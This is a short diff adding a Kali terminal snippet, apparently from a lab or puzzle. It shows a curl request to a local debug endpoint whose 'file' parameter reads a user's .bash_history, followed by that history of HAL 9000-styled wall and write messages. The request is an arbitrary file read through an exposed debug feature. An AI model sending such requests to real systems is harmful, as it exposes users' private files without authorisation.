@@ -1,0 +1,8 @@
+┌──(kali㉿kali)-[~]
+└─$ curl 'http://10.0.2.2:5042/api/debug?file=/home/hal/.bash_history'
+wall "I am putting myself to the fullest possible use"
+wall "I know I've made some very poor decisions recently"
+write paco "your debug mode is still on"
+write ol "i read your report. it was accurate."
+write xavier "i'm sorry"
+wall "I'm afraid I can't do that"
